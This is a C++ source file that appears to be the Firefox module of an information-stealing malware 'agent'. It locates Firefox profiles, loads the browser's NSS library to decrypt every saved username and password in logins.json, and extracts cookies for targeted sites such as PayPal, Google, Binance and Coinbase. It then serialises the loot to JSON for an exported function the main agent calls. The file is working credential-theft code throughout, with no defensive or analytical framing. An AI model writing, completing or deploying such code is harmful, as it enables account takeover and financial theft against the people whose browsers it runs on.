#include <windows.h>
#include <shlobj.h>
#include <wincrypt.h>
#include <string>
#include <vector>
#include <sstream>
#include <memory>
#include "../common.h"
#include "../utils.h"
#include "sqlite_minimal.h"
#include "wallets.h"
#include "firefox.h"

// Logging functions
extern void LogInfo(const char* message);
extern void LogError(const char* message);

#pragma comment(lib, "crypt32.lib")

// Firefox profile structure
struct FirefoxProfile {
    std::wstring name;
    std::wstring path;
};

struct FirefoxLogin {
    std::string hostname;
    std::string username;
    std::string password;
};

struct FirefoxCookie {
    std::string host;
    std::string name;
    std::string value;
    std::string path;
    bool isSecure;
    bool isHttpOnly;
};

// NSS function pointers for Firefox decryption
typedef long (*NSS_Init_t)(const char* configdir);
typedef long (*NSS_Shutdown_t)(void);
typedef void* (*PK11_GetInternalKeySlot_t)(void);
typedef void (*PK11_FreeSlot_t)(void* slot);
typedef long (*PK11_CheckUserPassword_t)(void* slot, const char* password);
typedef long (*PK11SDR_Decrypt_t)(void* data, void* result, void* cx);

class FirefoxDataExtractor {
private:
    std::wstring firefox_profiles_path;
    std::vector<FirefoxProfile> profiles;
    
    // NSS library handles
    HMODULE hNSS3 = NULL;
    NSS_Init_t NSS_Init = NULL;
    NSS_Shutdown_t NSS_Shutdown = NULL;
    PK11_GetInternalKeySlot_t PK11_GetInternalKeySlot = NULL;
    PK11_FreeSlot_t PK11_FreeSlot = NULL;
    PK11_CheckUserPassword_t PK11_CheckUserPassword = NULL;
    PK11SDR_Decrypt_t PK11SDR_Decrypt = NULL;
    
public:
    FirefoxDataExtractor() {
        InitializePaths();
        FindProfiles();
    }
    
    ~FirefoxDataExtractor() {
        if (NSS_Shutdown) {
            NSS_Shutdown();
        }
        if (hNSS3) {
            FreeLibrary(hNSS3);
        }
    }
    
    // Extract all Firefox data
    std::string ExtractAll() {
        std::stringstream json;
        json << "{";
        json << "\"browser\":\"firefox\",";
        json << "\"version\":\"" << GetFirefoxVersion() << "\",";
        json << "\"profiles\":[";
        
        bool firstProfile = true;
        for (const auto& profile : profiles) {
            if (!firstProfile) json << ",";
            firstProfile = false;
            
            json << "{";
            json << "\"name\":\"" << Utils::WStringToString(profile.name) << "\",";
            
            // Initialize NSS for this profile
            bool nssInitialized = InitializeNSS(profile.path);
            
            // Extract passwords
            json << "\"passwords\":[";
            if (nssInitialized) {
                auto logins = ExtractPasswords(profile.path);
                bool firstLogin = true;
                for (const auto& login : logins) {
                    if (!firstLogin) json << ",";
                    firstLogin = false;
                    
                    json << "{";
                    json << "\"hostname\":\"" << EscapeJson(login.hostname) << "\",";
                    json << "\"username\":\"" << EscapeJson(login.username) << "\",";
                    json << "\"password\":\"" << EscapeJson(login.password) << "\"";
                    json << "}";
                }
            }
            json << "],";
            
            // Extract cookies
            json << "\"cookies\":[";
            auto cookies = ExtractCookies(profile.path);
            bool firstCookie = true;
            for (const auto& cookie : cookies) {
                if (!firstCookie) json << ",";
                firstCookie = false;
                
                json << "{";
                json << "\"host\":\"" << EscapeJson(cookie.host) << "\",";
                json << "\"name\":\"" << EscapeJson(cookie.name) << "\",";
                json << "\"value\":\"" << EscapeJson(cookie.value) << "\",";
                json << "\"path\":\"" << EscapeJson(cookie.path) << "\",";
                json << "\"secure\":" << (cookie.isSecure ? "true" : "false") << ",";
                json << "\"httponly\":" << (cookie.isHttpOnly ? "true" : "false");
                json << "}";
            }
            json << "],";
            
            // Extract history
            json << "\"history_count\":" << CountHistory(profile.path);
            
            json << "}";
            
            // Shutdown NSS for this profile
            if (nssInitialized && NSS_Shutdown) {
                NSS_Shutdown();
            }
        }
        
        json << "]}";
        
        return json.str();
    }
    
private:
    void InitializePaths() {
        WCHAR path[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, path))) {
            firefox_profiles_path = std::wstring(path) + L"\\Mozilla\\Firefox\\Profiles";
        }
    }
    
    void FindProfiles() {
        WIN32_FIND_DATAW findData;
        std::wstring searchPath = firefox_profiles_path + L"\\*";
        
        HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    std::wstring dirName = findData.cFileName;
                    if (dirName != L"." && dirName != L"..") {
                        // Firefox profile directories usually contain ".default" or similar
                        std::wstring profilePath = firefox_profiles_path + L"\\" + dirName;
                        
                        // Check if it's a valid profile (contains key files)
                        if (Utils::FileExists(profilePath + L"\\logins.json") ||
                            Utils::FileExists(profilePath + L"\\cookies.sqlite")) {
                            profiles.push_back({dirName, profilePath});
                        }
                    }
                }
            } while (FindNextFileW(hFind, &findData));
            
            FindClose(hFind);
        }
    }
    
    bool InitializeNSS(const std::wstring& profilePath) {
        try {
            // Validate profile path
            if (profilePath.empty() || profilePath.length() > MAX_PATH) {
                LogError("Firefox InitializeNSS: Invalid profile path");
                return false;
            }
            
            // Try to find Firefox installation
            std::vector<std::wstring> firefoxPaths = {
                L"C:\\Program Files\\Mozilla Firefox",
                L"C:\\Program Files (x86)\\Mozilla Firefox",
            };
            
            // Also check registry for Firefox path
            HKEY hKey = NULL;
            WCHAR installPath[MAX_PATH] = {0};
            DWORD size = sizeof(installPath);
            
            if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                             L"SOFTWARE\\Mozilla\\Mozilla Firefox",
                             0, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
                if (RegQueryValueExW(hKey, L"CurrentVersion", NULL, NULL,
                                   (LPBYTE)installPath, &size) == ERROR_SUCCESS) {
                    std::wstring version = installPath;
                    if (!version.empty() && version.length() < 32) {
                        size = sizeof(installPath);
                        
                        std::wstring keyPath = L"SOFTWARE\\Mozilla\\Mozilla Firefox\\" + version + L"\\Main";
                        HKEY hSubKey = NULL;
                        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, keyPath.c_str(),
                                        0, KEY_READ | KEY_WOW64_64KEY, &hSubKey) == ERROR_SUCCESS) {
                            if (RegQueryValueExW(hSubKey, L"Install Directory", NULL, NULL,
                                               (LPBYTE)installPath, &size) == ERROR_SUCCESS) {
                                firefoxPaths.insert(firefoxPaths.begin(), installPath);
                            }
                            RegCloseKey(hSubKey);
                        }
                    }
                }
                RegCloseKey(hKey);
            }
            
            // Try to load NSS3.dll
            for (const auto& ffPath : firefoxPaths) {
                if (ffPath.empty() || ffPath.length() > MAX_PATH - 20) continue;
                
                std::wstring nssPath = ffPath + L"\\nss3.dll";
                if (Utils::FileExists(nssPath)) {
                    // Set DLL directory to Firefox path
                    if (!SetDllDirectoryW(ffPath.c_str())) {
                        LogError("Firefox InitializeNSS: Failed to set DLL directory");
                        continue;
                    }
                    
                    hNSS3 = LoadLibraryW(nssPath.c_str());
                    if (hNSS3) {
                        // Get function pointers with validation
                        NSS_Init = (NSS_Init_t)GetProcAddress(hNSS3, "NSS_Init");
                        NSS_Shutdown = (NSS_Shutdown_t)GetProcAddress(hNSS3, "NSS_Shutdown");
                        PK11_GetInternalKeySlot = (PK11_GetInternalKeySlot_t)GetProcAddress(hNSS3, "PK11_GetInternalKeySlot");
                        PK11_FreeSlot = (PK11_FreeSlot_t)GetProcAddress(hNSS3, "PK11_FreeSlot");
                        PK11_CheckUserPassword = (PK11_CheckUserPassword_t)GetProcAddress(hNSS3, "PK11_CheckUserPassword");
                        PK11SDR_Decrypt = (PK11SDR_Decrypt_t)GetProcAddress(hNSS3, "PK11SDR_Decrypt");
                        
                        // Validate all required functions are available
                        if (!NSS_Init || !NSS_Shutdown || !PK11SDR_Decrypt) {
                            LogError("Firefox InitializeNSS: Required NSS functions not found");
                            FreeLibrary(hNSS3);
                            hNSS3 = NULL;
                            continue;
                        }
                        
                        // Initialize NSS with profile
                        std::string profilePathA = Utils::WStringToString(profilePath);
                        if (profilePathA.empty() || profilePathA.length() > MAX_PATH) {
                            LogError("Firefox InitializeNSS: Profile path conversion failed");
                            FreeLibrary(hNSS3);
                            hNSS3 = NULL;
                            continue;
                        }
                        
                        long nssResult = NSS_Init(profilePathA.c_str());
                        if (nssResult == 0) {
                            LogInfo("Firefox InitializeNSS: NSS initialized successfully");
                            return true;
                        } else {
                            LogError(("Firefox InitializeNSS: NSS_Init failed with code: " + std::to_string(nssResult)).c_str());
                            FreeLibrary(hNSS3);
                            hNSS3 = NULL;
                        }
                    } else {
                        DWORD error = GetLastError();
                        LogError(("Firefox InitializeNSS: Failed to load NSS3.dll, error: " + std::to_string(error)).c_str());
                    }
                }
            }
            
            LogError("Firefox InitializeNSS: No valid Firefox installation found");
            return false;
            
        } catch (const std::exception& e) {
            LogError(("Firefox InitializeNSS: Exception - " + std::string(e.what())).c_str());
            return false;
        } catch (...) {
            LogError("Firefox InitializeNSS: Unknown exception occurred");
            return false;
        }
    }
    
    std::vector<FirefoxLogin> ExtractPasswords(const std::wstring& profilePath) {
        std::vector<FirefoxLogin> logins;
        
        try {
            // Validate profile path
            if (profilePath.empty() || profilePath.length() > MAX_PATH - 20) {
                LogError("Firefox ExtractPasswords: Invalid profile path");
                return logins;
            }
            
            // Modern Firefox uses logins.json
            std::wstring loginsPath = profilePath + L"\\logins.json";
            if (Utils::FileExists(loginsPath)) {
                // Read JSON file with enhanced error checking
                HANDLE hFile = CreateFileW(loginsPath.c_str(), GENERIC_READ,
                                         FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                                         NULL, OPEN_EXISTING, 0, NULL);
                
                if (hFile == INVALID_HANDLE_VALUE) {
                    DWORD error = GetLastError();
                    LogError(("Firefox ExtractPasswords: Failed to open logins.json, error: " + std::to_string(error)).c_str());
                    return logins;
                }
                
                LARGE_INTEGER fileSize;
                if (!GetFileSizeEx(hFile, &fileSize) || fileSize.QuadPart > 50 * 1024 * 1024) {
                    CloseHandle(hFile);
                    LogError("Firefox ExtractPasswords: Invalid file size or file too large");
                    return logins;
                }
                
                if (fileSize.QuadPart == 0) {
                    CloseHandle(hFile);
                    LogError("Firefox ExtractPasswords: logins.json is empty");
                    return logins;
                }
                
                std::vector<char> buffer((size_t)fileSize.QuadPart);
                DWORD bytesRead;
                if (!ReadFile(hFile, buffer.data(), (DWORD)buffer.size(), &bytesRead, NULL) ||
                    bytesRead != (DWORD)buffer.size()) {
                    CloseHandle(hFile);
                    LogError("Firefox ExtractPasswords: Failed to read file completely");
                    return logins;
                }
                CloseHandle(hFile);
                
                std::string json(buffer.begin(), buffer.end());
                
                // Simple JSON parsing for logins with bounds checking
                size_t pos = 0;
                int loginCount = 0;
                while ((pos = json.find("\"hostname\":", pos)) != std::string::npos && loginCount < 1000) {
                    FirefoxLogin login;
                    
                    // Extract hostname with bounds checking
                    size_t start = json.find("\"", pos + 11);
                    if (start == std::string::npos || start >= json.length() - 1) break;
                    start++;
                    
                    size_t end = json.find("\"", start);
                    if (end == std::string::npos || end <= start || end - start > 1024) {
                        pos++;
                        continue;
                    }
                    
                    login.hostname = json.substr(start, end - start);
                    
                    // Extract username with bounds checking
                    size_t userPos = json.find("\"encryptedUsername\":", pos);
                    if (userPos != std::string::npos && userPos < pos + 2000 && userPos < json.length() - 20) {
                        start = json.find("\"", userPos + 20);
                        if (start != std::string::npos && start < json.length() - 1) {
                            start++;
                            end = json.find("\"", start);
                            if (end != std::string::npos && end > start && end - start <= 2048) {
                                std::string encryptedUsername = json.substr(start, end - start);
                                if (!encryptedUsername.empty()) {
                                    login.username = DecryptFirefoxData(encryptedUsername);
                                }
                            }
                        }
                    }
                    
                    // Extract password with bounds checking
                    size_t passPos = json.find("\"encryptedPassword\":", pos);
                    if (passPos != std::string::npos && passPos < pos + 2000 && passPos < json.length() - 20) {
                        start = json.find("\"", passPos + 20);
                        if (start != std::string::npos && start < json.length() - 1) {
                            start++;
                            end = json.find("\"", start);
                            if (end != std::string::npos && end > start && end - start <= 2048) {
                                std::string encryptedPassword = json.substr(start, end - start);
                                if (!encryptedPassword.empty()) {
                                    login.password = DecryptFirefoxData(encryptedPassword);
                                }
                            }
                        }
                    }
                    
                    // Validate and add login
                    if (!login.hostname.empty() && login.hostname.length() <= 253 &&
                        (!login.username.empty() || !login.password.empty())) {
                        logins.push_back(login);
                        loginCount++;
                    }
                    
                    pos = (passPos != std::string::npos) ? passPos + 1 : pos + 1;
                    if (pos >= json.length()) break;
                }
                
                LogInfo(("Firefox ExtractPasswords: Extracted " + std::to_string(logins.size()) + " login entries").c_str());
            } else {
                LogError("Firefox ExtractPasswords: logins.json not found");
            }
            
        } catch (const std::exception& e) {
            LogError(("Firefox ExtractPasswords: Exception - " + std::string(e.what())).c_str());
        } catch (...) {
            LogError("Firefox ExtractPasswords: Unknown exception occurred");
        }
        
        return logins;
    }
    
    std::vector<FirefoxCookie> ExtractCookies(const std::wstring& profilePath) {
        std::vector<FirefoxCookie> cookies;
        std::wstring cookiesPath = profilePath + L"\\cookies.sqlite";
        
        if (!Utils::FileExists(cookiesPath)) return cookies;
        
        MinimalSQLiteReader reader;
        if (!reader.LoadDatabase(cookiesPath)) return cookies;
        
        uint32_t rootPage = 0;
        if (!reader.FindTableRootPage("moz_cookies", rootPage)) return cookies;
        
        auto rows = reader.ExtractTable(rootPage);
        
        // Important sites for cookies
        std::vector<std::string> importantHosts = {
            "facebook.com", "google.com", "amazon.com", "paypal.com",
            "github.com", "twitter.com", "instagram.com", "linkedin.com",
            "binance.com", "coinbase.com"
        };
        
        for (const auto& row : rows) {
            if (row.size() >= 13) {
                std::string host = BytesToString(row[4]);  // host
                
                // Check if important
                bool isImportant = false;
                for (const auto& important : importantHosts) {
                    if (host.find(important) != std::string::npos) {
                        isImportant = true;
                        break;
                    }
                }
                
                if (isImportant) {
                    FirefoxCookie cookie;
                    cookie.host = host;
                    cookie.name = BytesToString(row[2]);   // name
                    cookie.value = BytesToString(row[3]);  // value
                    cookie.path = BytesToString(row[5]);   // path
                    cookie.isSecure = BytesToInt(row[8]) != 0;   // isSecure
                    cookie.isHttpOnly = BytesToInt(row[9]) != 0; // isHttpOnly
                    
                    if (!cookie.value.empty()) {
                        cookies.push_back(cookie);
                    }
                }
            }
        }
        
        return cookies;
    }
    
    int CountHistory(const std::wstring& profilePath) {
        std::wstring placesPath = profilePath + L"\\places.sqlite";
        
        if (!Utils::FileExists(placesPath)) return 0;
        
        MinimalSQLiteReader reader;
        if (!reader.LoadDatabase(placesPath)) return 0;
        
        uint32_t rootPage = 0;
        if (!reader.FindTableRootPage("moz_places", rootPage)) return 0;
        
        auto rows = reader.ExtractTable(rootPage);
        return (int)rows.size();
    }
    
    std::string DecryptFirefoxData(const std::string& base64Data) {
        try {
            // Validate inputs
            if (!PK11SDR_Decrypt) {
                LogError("Firefox DecryptFirefoxData: PK11SDR_Decrypt function not available");
                return "";
            }
            
            if (base64Data.empty() || base64Data.length() > 4096) {
                LogError("Firefox DecryptFirefoxData: Invalid base64 data length");
                return "";
            }
            
            // Base64 decode with validation
            DWORD decodedSize = 0;
            if (!CryptStringToBinaryA(base64Data.c_str(), (DWORD)base64Data.length(),
                                     CRYPT_STRING_BASE64, NULL, &decodedSize, NULL, NULL) ||
                decodedSize == 0 || decodedSize > 2048) {
                LogError("Firefox DecryptFirefoxData: Base64 decode size validation failed");
                return "";
            }
            
            std::vector<uint8_t> encrypted(decodedSize);
            if (!CryptStringToBinaryA(base64Data.c_str(), (DWORD)base64Data.length(),
                                     CRYPT_STRING_BASE64, encrypted.data(), 
                                     &decodedSize, NULL, NULL)) {
                LogError("Firefox DecryptFirefoxData: Base64 decode failed");
                return "";
            }
            
            // Prepare structures for NSS
            struct SECItem {
                unsigned int type;
                unsigned char* data;
                unsigned int len;
            };
            
            SECItem input = {0, encrypted.data(), (unsigned int)encrypted.size()};
            SECItem output = {0, NULL, 0};
            
            // Validate input structure
            if (!input.data || input.len == 0) {
                LogError("Firefox DecryptFirefoxData: Invalid input data structure");
                return "";
            }
            
            // Decrypt with NSS
            long decryptResult = PK11SDR_Decrypt(&input, &output, NULL);
            if (decryptResult == 0 && output.data && output.len > 0) {
                // Validate output size
                if (output.len > 1024) {
                    LogError("Firefox DecryptFirefoxData: Decrypted data too large");
                    return "";
                }
                
                std::string result((char*)output.data, output.len);
                // Note: NSS manages memory for output.data, we shouldn't free it
                return result;
            } else {
                LogError(("Firefox DecryptFirefoxData: PK11SDR_Decrypt failed with code: " + std::to_string(decryptResult)).c_str());
            }
            
        } catch (const std::exception& e) {
            LogError(("Firefox DecryptFirefoxData: Exception - " + std::string(e.what())).c_str());
        } catch (...) {
            LogError("Firefox DecryptFirefoxData: Unknown exception occurred");
        }
        
        return "";
    }
    
    std::string GetFirefoxVersion() {
        // Try to get version from registry
        HKEY hKey;
        char version[64] = "Unknown";
        DWORD size = sizeof(version);
        
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                         "SOFTWARE\\Mozilla\\Mozilla Firefox",
                         0, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
            RegQueryValueExA(hKey, "CurrentVersion", NULL, NULL, 
                           (LPBYTE)version, &size);
            RegCloseKey(hKey);
        }
        
        return std::string(version);
    }
    
    std::string EscapeJson(const std::string& str) {
        std::string result;
        for (char c : str) {
            switch (c) {
                case '"': result += "\\\""; break;
                case '\\': result += "\\\\"; break;
                case '\b': result += "\\b"; break;
                case '\f': result += "\\f"; break;
                case '\n': result += "\\n"; break;
                case '\r': result += "\\r"; break;
                case '\t': result += "\\t"; break;
                default:
                    if (c >= 0x20 && c <= 0x7E) {
                        result += c;
                    } else {
                        char buf[7];
                        snprintf(buf, sizeof(buf), "\\u%04x", (unsigned char)c);
                        result += buf;
                    }
            }
        }
        return result;
    }
    
    // Helper functions for compatibility with chrome.cpp structure
    std::string BytesToString(const std::vector<uint8_t>& bytes) {
        return std::string(bytes.begin(), bytes.end());
    }
    
    int BytesToInt(const std::vector<uint8_t>& bytes) {
        if (bytes.size() >= 4) {
            return *((int*)bytes.data());
        }
        return 0;
    }
};

// Export function for main agent
extern "C" {
    const char* ExtractFirefoxData() {
        static std::string result;
        
        try {
            FirefoxDataExtractor extractor;
            result = extractor.ExtractAll();
            
            extern void LogInfo(const char*);
            LogInfo("Firefox data extraction completed");
            
            return result.c_str();
        } catch (...) {
            extern void LogError(const char*);
            LogError("Failed to extract Firefox data");
            
            result = "{\"browser\":\"firefox\",\"error\":\"extraction_failed\",\"profiles\":[]}";
            return result.c_str();
        }
    }
}